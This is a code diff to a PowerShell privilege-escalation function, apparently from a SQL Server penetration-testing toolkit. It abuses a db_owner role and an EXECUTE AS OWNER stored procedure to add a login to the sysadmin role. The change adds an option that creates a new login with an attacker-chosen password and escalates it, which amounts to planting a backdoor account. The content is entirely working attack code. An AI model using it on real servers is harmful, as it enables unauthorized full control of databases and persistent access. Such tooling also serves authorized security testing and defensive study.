@@ -173,9 +173,20 @@ function Invoke-SqlServerDbElevateDbOwner
             $ElevateOnDb = $_.db            
         }
 
+        # Add new user if provided
+        if ($newuser -and $newPass){
+            $AddUser = "CREATE LOGIN $newuser WITH PASSWORD = '$newPass'"
+            $UsertoElevate = $newuser
+            $Message = " create and"
+        }else{
+            $AddUser = ""
+            $UsertoElevate = $ConnectUser
+            $Message = ""
+        }
+
         # Status user
         write-host "[*] $ConnectUser has db_owner role in $DbOwnerRoleCount of the databases." -foreground "green"
-        write-host "[*] Attempting add $ConnectUser to the sysadmin role via the $ElevateOnDb database..."      
+        write-host "[*] Attempting to$Message add $UsertoElevate to the sysadmin role via the $ElevateOnDb database..."      
 
         # Set authentication type and create connection string for the targeted database 
         if($SqlUser -and $SqlPass){   
@@ -201,7 +212,8 @@ function Invoke-SqlServerDbElevateDbOwner
         WITH EXECUTE AS OWNER
         AS
         begin
-        EXEC sp_addsrvrolemember '$ConnectUser','sysadmin'
+        $AddUser
+        EXEC sp_addsrvrolemember '$UsertoElevate','sysadmin'
         end"
 		$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
 		$results = $cmd.ExecuteReader() 
@@ -230,7 +242,7 @@ function Invoke-SqlServerDbElevateDbOwner
         $conn.Close() 
         
         if ($CheckforSysadmin -ne 0){
-            write-host "[*] Success! - $ConnectUser is now a sysadmin." -foreground "green" 
+            write-host "[*] Success! - $UsertoElevate is now a sysadmin." -foreground "green" 
             
         }else{
             write-host "[*] Sorry, something failed, no sysadmin for you." -foreground "red" 
